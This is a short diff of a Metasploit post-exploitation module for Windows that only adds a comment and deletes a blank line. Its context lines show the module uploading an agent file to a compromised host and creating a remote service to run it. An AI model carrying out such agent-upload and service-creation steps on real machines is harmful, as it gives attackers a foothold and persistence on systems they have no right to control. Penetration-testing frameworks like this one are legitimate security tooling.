@@ -117,7 +117,7 @@ class MetasploitModule < Msf::Post
                         'DisclosureDate' => 'nov 18 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'true',
+                        'Privileged'     => 'true', # requires elevated privileges
                         'Targets'        =>
                                 [
                                          # Tested againts windows 7 (build 7600/7601) SP 1 | XP SP1 (32 bits)
@@ -216,7 +216,6 @@ def ls_stage1
         print_good(" Uploading #{p_name} agent...")
         client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
         sleep(1.0)
-
 
           # creating remote service ...
           print_good(" Creating service: #{s_name} ...")
